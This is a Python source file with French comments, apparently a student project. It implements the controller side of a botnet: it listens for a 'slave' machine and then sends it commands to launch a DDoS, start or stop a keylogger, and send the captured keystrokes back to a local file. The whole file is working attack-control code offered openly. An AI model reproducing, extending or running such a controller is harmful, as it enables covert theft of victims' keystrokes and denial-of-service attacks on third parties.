#importation du module socket afin de permetttre une communication réseau
#importation  d'argparse afin de pouvoir créer des argument
import socket as modSocket
import argparse
import threading
import time

lock = threading.Lock()

class Connexion():
    # création de l'objet connexion avec le champ adresseMachine.
    def __init__(self, adresseMachine, carteReseauEcoute, carteReseauConn, listeIP):
        self.adresseMachine = adresseMachine
        self.carteReseauEcoute = carteReseauEcoute
        self.carteReseauConn = carteReseauConn
        self.listeIP = listeIP


    def choixS(self):
        try:
            select = int(input("1)ecoute \n2)connexion \n3)FIN \nSélectionnez une option : "))
            while select != 3:
                if select == 1:
                    objetChoixAction.listen(carteReseauEcoute)
                    select = int(input("1)ecoute \n2)connexion \n3)FIN \nSélectionnez une option : "))
                elif select == 2:
                    objetChoixAction.receive(carteReseauConn, listeIP)
                    objetChoixAction.choix()
                    select = int(input("1)ecoute \n2)connexion \n3)FIN \nSélectionnez une option : "))
        except ValueError:
            objetChoixAction.choixS()

    #1er étape, mettre en place un canal de communication pour recevoir les messages du slave
    def listen(self, carteReseauEcoute):
        # écoute sur toutes les adresses disponibles sur la machine et sur le port 60 000
        carteReseauEcoute.bind(("", 60000))
        # une fois connecté, on le met en écoute afin qu'il reçoive l'IP du slave; l'IP sera contenue dans addr
        carteReseauEcoute.listen()
        print("Attente de connexion")
        connReseau, addr = carteReseauEcoute.accept()
        print(connReseau)
        listeIP.append(addr[0])
        print ("L'IP du slave est : ", listeIP[0])
        time.sleep(2)
        carteReseauEcoute.close()
        return listeIP
    

    # 2è étape, mettre en place un canal de communication pour envoyer des messages au slave
    def receive(self, carteReseauConn ,listeIP):
        # on définit les coordonnées sur lesquelles le master va envoyer ses instructions
        try:
            print(listeIP)#est ce vraiment utile ?
            #si la liste n'est pas vide
            if len(listeIP) != 0:
                for adresse in listeIP:
                    carteReseauConn.connect((adresse, 60000))
                    print("Connection établie avec l'esclave")
                    
            else:
                print("On ne connait pas de machine esclave")
        #except: va print "erreur" si il n'y a pas eu de connexion
        except ConnectionRefusedError:
            print("Erreur de connexion")


"""
création de l'objet ChoixAction
avec le champ adresseMachine et s.
adresseMachine, va contenire l'adresse et le port sur lequel on va essayer de se connecter.
(petit défi pour toi. Si tu veux, essaye de faire en sorte que adresseMachine soit une liste avec plusieurs IP(differents esclaves)
et fais une boucle qui va permettre de se connecter a tous ces clients. )
s va contenire les infos sur le type de communication ect ...
Création de pusieurs methodes afin de choisir l'action a faire
sur le slave.
Ils vont tous avoir la même action a faire c'est à dire envoyer un message au client
pour activer une action.
"""

class ChoixAction(Connexion):
    
    def choix(self):
        #petit choix multiple afin de savoir quelle methode on doit lancer
        select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        while select != 5:
            #on essaie le choix multiple
            try:
                if select == 1:
                    #lance la methode ddos de l'objet choixAction
                    objetChoixAction.ddos(carteReseauConn)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 2:
                    #lance la methode start de l'objet choixAction
                    objetChoixAction.start_log(carteReseauConn)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 3:
                    #lance la methode stop de l'objet choixAction
                    objetChoixAction.stop_log(carteReseauConn)
                    objetChoixAction.fin(carteReseauConn)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 4:
                    #lance la methode get de l'objet choixAction
                    objetChoixAction.get_log(carteReseauConn)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 5:
                    #lance la methode get de l'objet choixAction
                    objetChoixAction.fin(carteReseauConn)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
            #si la connexion est arretée par le client pendant le choix multiple, il affichera le message ci dessous
            except ConnectionAbortedError:
                print("connexion arretée par le client")

    def start_log(self, carteReseauConn):
        print("Choix d'attaque : Keylogger. Signal envoyé")
        #envoie keylogger au client 
        carteReseauConn.send("keylogger".encode("utf-8"))
        #reçois directement sa réponse

    def ddos(self, carteReseauConn):
        #idem
        print("Choix d'attaque : DDoS. Signal envoyé")
        carteReseauConn.send("ddos".encode("utf-8"))
    
    def stop_log(self, carteReseauConn):
        #idem
        print("Choix d'attaque : stop keylogger. Signal envoyé")
        carteReseauConn.send("stop".encode("utf-8"))

        print(carteReseauConn.recv(1024).decode("utf-8"))
    
    def get_log(self, carteReseauConn):
        #idem
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        carteReseauConn.send("transfert".encode("utf-8"))
        fichier = open("keylog.txt", "wb")
        l = carteReseauConn.recv(1024)
        fichier.write(l)


    def fin(self, carteReseauConn):
        #idem
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        carteReseauConn.send("FIN".encode("utf-8"))
        print(carteReseauConn.recv(1024).decode("utf-8"))
        
    
#on initie s et adresseMachine
listeIP = ["127.0.0.1"]
adresseMachine = ("localhost", 5000)
carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
carteReseauConn = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
#on assigne l'objet choixAction qui est l'enfant de l'objet Communication à la variable a
objetChoixAction = ChoixAction(adresseMachine, carteReseauConn, carteReseauEcoute, listeIP)
objetChoixAction.choixS()





"""
Pour rendre le code plus cool ont pourrait rajouter des arguments grace
au module argparse, on essaiera de mettre ça en place pour afficher par exemple les adresse avec
lesquels il sera connecter ect .......
À voir ce n'est pas urgent
"""

